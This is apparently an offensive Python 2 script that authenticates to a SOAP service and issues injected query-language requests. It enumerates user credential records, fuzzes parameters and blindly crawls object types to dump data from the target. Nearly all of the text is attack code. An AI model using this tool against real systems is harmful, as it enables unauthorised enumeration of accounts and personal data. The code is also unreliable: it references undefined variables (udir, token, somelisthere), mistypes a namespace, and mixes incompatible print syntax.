#!/usr/bin/env python
#
# Used to query SQLi db and get results
#
import os, re, sys, requests
#
# User arguments
target=sys.argv[1]
uname=sys.argv[2]
pword=sys.argv[3]
dir=sys.argv[4]
# Static vars
gmt="-7"
services="/mypage.asmx"
url="http://"+target+services


# performs nonGMTauth to SOAP interface
def nonGMTauth(uname,pword,udir):
	body = """<?xml version="1.0" encoding="UTF-8"?>
	<soap12:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap12="http://www.w3.org/2003/05/soap-envelope"> 
		<soap12:Body>
			<Authenticate xmlns="http://fenel.com/OG">
				<userName>"""+uname+"""</userName>
				<password>"""+pword+"""</password>
				<directoryId>"""+str(udir)+"""</directoryId>
			</Authenticate>
		</soap12:Body>
	</soap12:Envelope>
	"""
	return body
# perfoms GMTauth to SOAP interface


def GMTauth(uname,pword,udir):
	gmt="-7"
	body="""<?xml version="1.0" encoding="utf-8"?>
	<soap12:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap12="http://www.w3.org/2003/05/soap-envelope">
		<soap12:Body>
			<AuthenticateWithGMTOffset xmlns="http://fenel.com/OG">
				<userName>"""+uname+"""</userName>
				<password>"""+pword+"""</password>
				<directoryId>"""+str(udir)+"""</directoryId>
				<gmtOffset>"""+str(gmt)+"""</gmtOffset>
			</AuthenticateWithGMTOffset>
		</soap12:Body>
	</soap12:Envelope>"""
	return body
# performs the actual request && captures request


def doAuth(target,authfunction):
	headers = {'content-type': 'application/soap+xml; charset=utf-8', 'Host': target, 'Content-Length': str(len(authfunction))}
	response = requests.post(url,data=authfunction,headers=headers)
	return response.content
# For loop 10 iterations, to produce session token from legit user:pass pair


def tokenGenerator(count):
 for x in range(0,count):
   results=doAuth(target,GMTauth(uname,pword,udir))
   searchToken=re.search('<authResultns:Token>(.*)<\/authResultns:Token>',results)
   token=searchToken.groups(1)[0]
   return token
# main function


def getUserInfo(token, IncrementID):
	pagesize="-1" # usually negative 1
	skipcount="-1" # usually negative 1 
	includeMVRP="false" # boolean
	autoLoadAllProperties="false" # boolean
	forcePropertyLoads="false" # boolean
	writeFullAssociationOnlyObjects="false" #boolean
	body="""<?xml version="1.0" encoding="utf-8"?>
	 <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" >
	  <soap:Header>
	   <LnlSOAPHeader xmlns="http://fenel.com/OG">
		<TokenId>"""+str(token)+"""</TokenId>
	   </LnlSOAPHeader>
	  </soap:Header>
	  <soap:Body>
	   <ExecuteLPathQuery xmlns="http://fenel.com/OG">
		<lPathQuery>SELECT * FROM ObjectModel.Credentials.Principal WHERE Id = """+str(IncrementID)+"""</lPathQuery>
		<pageSize>"""+str(pagesize)+"""</pageSize>
		<skipCount>"""+str(skipcount)+"""</skipCount>
		<includeMVRP>"""+str(includeMVRP)+"""</includeMVRP>
		<autoLoadAllProperties>"""+str(autoLoadAllProperties)+"""</autoLoadAllProperties>
		<forcePropertyLoads>"""+str(forcePropertyLoads)+"""</forcePropertyLoads>
		<writeFullAssociationOnlyObjects>"""+str(writeFullAssociationOnlyObjects)+"""</writeFullAssociationOnlyObjects>
	   </ExecuteLPathQuery>
	  </soap:Body>
	 </soap:Envelope>"""
	return body


def sendtargets(target, authfunction):
	headers = {
		'Content-type': 'application/soap+xml; charset=utf-8',
		'Host': target,
		'Content-Length': str(len(authfunction)),
		'Origin': 'http://localhost',
		'SOAPAction': 'http://fenel.com/OG/ExecuteLPathQuery',
		'User-Agent': 'Mozilla/5.0',
		'Content-Type': 'text/xml; charset=UTF-8',
		'Accept': '*/*',
		'Referer': 'http://localhost/.aspx',
		'Accept-Encoding': 'gzip, deflate',
		'Accept-Language': 'en-US,en;q=0.8',
		'Cookie': 'locale=en-US',
		'Connection': 'close',
	}
	response=requests.post(url,data=authfunction,headers=headers)
	return response.content


def parseReply(reply):
	try:
		try:
			DatabaseId=re.search('DatabaseId\">(.*)<\/objectns',reply)
		except Exception as e:
			#print e ## Diagnostics
			pass				
		try:
			UserID=re.search('name\=\"Id\">(.*)<\/objectns',reply)
		except Exception as e:
			#print e ## Diagnostics
			pass		
		try:
			FirstName=re.search('name\=\"FirstName\">(.*)<\/objectns',reply)
		except Exception as e:
			#print e ## Diagnostics
			pass		
		try:
			LastName=re.search('name\=\"LastName\">(.*)<\/objectns',reply)
		except Exception as e:
			#print e ## Diagnostics
			pass
		try:
			UserName=re.search('name\=\"Name\">(.*)<\/objectns',reply)
		except Exception as e:
			#print e ## Diagnostics
			pass
		try:
			HasViewOnlyAAMAccess=re.search('name\=\"HasViewOnlyAAMAccess\">(.*)<\/objectns',reply)
		except Exception as e:
			#print e ## Diagnostics
			pass		
		try:
			HasInternalAccount=re.search('name\=\"HasInternalAccount\">(.*)<\/objectns',reply)
		except Exception as e:
			#print e ## Diagnostics
			pass		
		try:
			IsAutomaticallyCreatedUser=re.search('name\=\"IsAutomaticallyCreatedUser\">(.*)<\/objectns',reply)
		except Exception as e:
			#print e ## Diagnostics
			pass		
		try:
			IsEnabled=re.search('name\=\"IsEnabled\">(.*)<\/objectns',reply)
		except Exception as e:
			#print e ## Diagnostics
			pass
		try:
			IsSystem=re.search('name\=\"IsSystem\">(.*)<\/objectns',reply)
		except Exception as e:
			#print e ## Diagnostics
			pass
		try:
			VideoLayouts=re.search('name\=\"VideoLayouts xsi\:nil\=\"(.*)\/>',reply)
		except Exception as e:
			#print e ## Diagnostics
			pass
		try:
			PrincipalAccessLevelLinks=re.search('name\=\"PrincipalAccessLevelLinks xsi\:nil\=\"(.*)\/>',reply)
		except Exception as e:
			#print e ## Diagnostics
			pass
		# make printout pretty
		print("Showing original reply output: %s") % (reply)
		print 
		try:
			if UserName:
				print("--------------------------------------------------------------------------------")
			print("\t[-] Found Database ID: ").ljust(30, ' ') + str(DatabaseId.groups(0)[0])
		except Exception as e:
			#print e ## Diagnostics
			pass
		try:
			print("\t[-] Found User ID: ").ljust(30, ' ') + str(UserID.groups(0)[0])
		except Exception as e:
			#print e ## Diagnostics
			pass
		try:
			print("\t[-] Found UserName ID: ").ljust(30, ' ') + str(UserName.groups(0)[0])
		except Exception as e:
			#print e ## Diagnostics
			pass
		try:
			print("\t[-] Found Firstname: ").ljust(30, ' ') + str(FirstName.groups(0)[0])
		except Exception as e:
			#print e ## Diagnostics
			pass
		try:
			print("\t[-] Found Lastname: ").ljust(30, ' ') + str(LastName.groups(0)[0])	
		except Exception as e:
			#print e ## Diagnostics
			pass
		try:	
			print("\t[-] Is View only access?: ").ljust(30, ' ') + str(HasViewOnlyAAMAccess.groups(0)[0])		
		except Exception as e:
			#print e ## Diagnostics
			pass
		try:	
			print("\t[-] Is AutoGen account?: ").ljust(30, ' ') + str(IsAutomaticallyCreatedUser.groups(0)[0])		
		except Exception as e:
			#print e ## Diagnostics
			pass
		try:	
			print("\t[-] Is enabled?: ").ljust(30, ' ') + str(IsEnabled.groups(0)[0])		
		except Exception as e:
			#print e ## Diagnostics
			pass
		try:	
			print("\t[-] Is System Account?: ").ljust(30, ' ') + str(IsSystem.groups(0)[0])			
		except Exception as e:
			#print e ## Diagnostics
			pass
		try:	
			print("\t[-] Has Internal Account?: ").ljust(30, ' ') + str(HasInternalAccount.groups(0)[0])	
		except Exception as e:
			#print e ## Diagnostics
			pass
		try:	
			print("\t[-] Has Video Layouts?: ").ljust(30, ' ') + str(VideoLayouts.groups(0)[0])
		except Exception as e:
			#print e ## Diagnostics
			pass
		try:	
			print("\t[-] Has Principal Access ?: ").ljust(30, ' ') + str(PrincipalAccessLevelLinks.groups(0)[0])
		except Exception as e:
			#print e ## Diagnostics
			pass
		print
		if UserName:
			print("--------------------------------------------------------------------------------")
	except Exception as e:
		pass


def findUsers(lowr,uppr):
	for userid in range(lowr,uppr+1):
		parseReply(sendtargets(target,getUserInfo(token, str(userid))))


def SQLifuzzUserInfo(token): ## Fuzzes the boolean and some incremental objects
	for xboo in ["true","false"]:
		autoLoadAllProperties=xboo # boolean
		for xmvrp in ["true","false"]:
			includeMVRP=xmvrp # boolean
			for xauto in ["true","false"]:
				autoLoadAllProperties=xauto # boolean
				for xfce in ["true","false"]:
					forcePropertyLoads=xfce # boolean
					for xwrite in ["true","false"]:
						writeFullAssociationOnlyObjects=xwrite #boolean
					for xpage in range(-5,10+1):
						pagesize=xpage # usually negative 1
						for xskip in range(-5,10+1):
							skipcount=xskip # usually negative 1
							for xinc in range(-5,10+1):
								IncrementID=xinc
								body="""<?xml version="1.0" encoding="utf-8"?>
								 <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" >
								  <soap:Header>
								   <LnlSOAPHeader xmlns="http://fenel.com/OG">
									<TokenId>"""+str(token)+"""</TokenId>
								   </LnlSOAPHeader>
								  </soap:Header>
								  <soap:Body>
								   <ExecuteLPathQuery xmlns="http://fenel.com/OG">
									<lPathQuery>SELECT * FROM ObjectModel.Credentials.Principal WHERE Id = """+str(IncrementID)+"""</lPathQuery>
									<pageSize>"""+str(pagesize)+"""</pageSize>
									<skipCount>"""+str(skipcount)+"""</skipCount>
									<includeMVRP>"""+str(includeMVRP)+"""</includeMVRP>
									<autoLoadAllProperties>"""+str(autoLoadAllProperties)+"""</autoLoadAllProperties>
									<forcePropertyLoads>"""+str(forcePropertyLoads)+"""</forcePropertyLoads>
									<writeFullAssociationOnlyObjects>"""+str(writeFullAssociationOnlyObjects)+"""</writeFullAssociationOnlyObjects>
								   </ExecuteLPathQuery>
								  </soap:Body>
								 </soap:Envelope>"""
								print sendtargets(target,body)

SQLifuzzUserInfo(token)


def interpage(reply):
	nextPage=re.search("<resultns:NextPageQuery>\"(.*)\"<\/(.*)", reply)
	if nextPage:
		trypage=nextPage.groups(1)[0]
		SQLiBlind(token,[trypage])


def SQLiBlind(token,blindlist):
	rescan=[]
	for xinc in blindlist:
		IncrementID=1
		body="""<?xml version="1.0" encoding="utf-8"?>
		 <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" >
		  <soap:Header>
		   <LnlSOAPHeader xmlns="http://fenel.com/OG">
			<TokenId>"""+str(token)+"""</TokenId>
		   </LnlSOAPHeader>
		  </soap:Header>
		  <soap:Body>
		   <ExecuteLPathQuery xmlns="http://fenelL.com/OG">
			<lPathQuery>"""+str(xinc)+"""</lPathQuery>
			<pageSize>20</pageSize>
			<skipCount>-1</skipCount>
			<includeMVRP>true</includeMVRP>
			<autoLoadAllProperties>true</autoLoadAllProperties>
			<forcePropertyLoads>false</forcePropertyLoads>
			<writeFullAssociationOnlyObjects>false</writeFullAssociationOnlyObjects>
		   </ExecuteLPathQuery>
		  </soap:Body>
		 </soap:Envelope>"""
		reply=sendtargets(target,body)
		try:
			isFailed=re.search('<faultstring>',reply)
			if isFailed:
				pass
			else:
				isZero=re.search('resultCount="0"',reply)
				if isZero:
					pass
				else:
					print("-" * 80)
					print("query: ").ljust(30, ' ') + str(xinc) 
					print("Reply: %s") % (reply)
					print("-" * 80)
					try:
						newquery=re.findall('<objectns:object id=\"(.*)\" type=\"(.*)\" objectId=\"(.*)\">',reply)
						#print("NewQuery: %s") % (newquery)
						for xquery in newquery:
							nqtype=xquery[1]
							if nqtype in blindlist:
								#print("Already seen Xquery: %s") % (nqtype)
								pass
							else:
								#print("Have not seen Xquery: %s") % (nqtype)
								rescan.append("SELECT * FROM " + nqtype)
								#print("\t\t[---] New Query Added: %s ... ") % (nqtype)
					except Exception as e:
						#print e ## Diagnostics
						pass
					try:
						nextquery=re.findall('<objectns:property name\=\"Name\">Lnl\.(.*)<\/',reply)
						print("nextquery: %s") % (nextquery)
						for xquery in nextquery:
							nqtype="Lnl."+xquery
							if nqtype in blindlist:
								print("Already seen Xquery: %s") % (nqtype)
								pass
							else:
								#print("Have not seen Xquery: %s") % (nqtype)
								rescan.append("SELECT * FROM " + nqtype)
								#print("\t\t[---] New Query Added: %s ... ") % (nqtype)
					except Exception as e:
						#print e ## Diagnostics
						pass
					def interpage(reply):
						print("Trying Interpage " + "-" * 80)
						nextPage=re.search("<resultns:NextPageQuery>\"(.*)\"<\/(.*)", reply)
						if nextPage:
							print("Found next pages, making request ..... ")
							trypage=nextPage.groups(1)[0]
							SQLiBlind(token,[trypage])
					interpage(reply)
		except Exception as e:
			#print e ## Diagnostics
			pass
	newscan=sorted(set(rescan))
	print newscan

SQLiBlind(token,somelisthere)
